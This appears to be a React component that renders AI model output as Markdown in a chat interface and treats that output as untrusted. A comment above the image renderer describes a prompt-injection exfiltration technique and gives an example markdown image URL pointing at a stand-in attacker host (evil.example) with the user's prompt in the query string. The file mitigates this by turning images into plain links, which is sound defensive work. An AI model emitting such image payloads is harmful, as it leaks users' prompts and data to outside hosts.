"use client";

import ReactMarkdown, { type Components } from "react-markdown";
import remarkGfm from "remark-gfm";
import { CITE_HREF, linkCitations } from "@/lib/citations";
import { cn } from "@/lib/utils";

const components: Components = {
  a: ({ href, children }) =>
    href === CITE_HREF ? (
      <span className="bg-accent-soft text-accent-soft-foreground mx-0.5 rounded px-1.5 py-0.5 text-xs font-medium whitespace-nowrap">{children}</span>
    ) : (
      <a href={href} target="_blank" rel="noreferrer noopener" className="text-primary underline underline-offset-2">
        {children}
      </a>
    ),
  // Never fetch images named in model output: a prompt-injected answer could use
  // ![](https://evil.example/?q=<the user's prompt>) to send data out. Show a link instead.
  img: ({ src, alt }) => (
    <a href={typeof src === "string" ? src : undefined} target="_blank" rel="noreferrer noopener" className="text-primary underline underline-offset-2">
      [image: {alt || "untitled"}]
    </a>
  ),
  table: ({ children }) => (
    <div className="my-2 overflow-x-auto">
      <table className="w-full border-collapse text-xs">{children}</table>
    </div>
  ),
  th: ({ children }) => <th className="bg-muted border px-2 py-1 text-left font-medium">{children}</th>,
  td: ({ children }) => <td className="border px-2 py-1 align-top">{children}</td>,
  pre: ({ children }) => <pre className="bg-muted my-2 overflow-x-auto rounded-md p-3 text-xs">{children}</pre>,
  code: ({ children, className }) => <code className={cn("bg-muted rounded px-1 py-0.5 font-mono text-[0.85em]", className)}>{children}</code>,
  ul: ({ children }) => <ul className="my-2 list-disc space-y-1 pl-5">{children}</ul>,
  ol: ({ children }) => <ol className="my-2 list-decimal space-y-1 pl-5">{children}</ol>,
  h1: ({ children }) => <h3 className="mt-3 mb-1 text-base font-semibold">{children}</h3>,
  h2: ({ children }) => <h3 className="mt-3 mb-1 text-base font-semibold">{children}</h3>,
  h3: ({ children }) => <h4 className="mt-3 mb-1 font-semibold">{children}</h4>,
  h4: ({ children }) => <h4 className="mt-2 mb-1 font-semibold">{children}</h4>,
  p: ({ children }) => <p className="my-2 leading-relaxed">{children}</p>,
  hr: () => <hr className="my-3" />,
  blockquote: ({ children }) => <blockquote className="text-muted-foreground border-l-2 pl-3">{children}</blockquote>,
};

/**
 * Model output as Markdown (GFM tables, lists, code). Model output is untrusted:
 * raw HTML is not rendered (react-markdown's default, no rehype-raw), link URLs
 * go through react-markdown's default urlTransform (javascript: and data: are
 * dropped), and images become links (above).
 */
export function Markdown({ text, citations = false, className }: { text: string; citations?: boolean; className?: string }) {
  return (
    <div className={cn("text-sm break-words [&>*:first-child]:mt-0", className)}>
      <ReactMarkdown remarkPlugins={[remarkGfm]} components={components}>
        {citations ? linkCitations(text) : text}
      </ReactMarkdown>
    </div>
  );
}
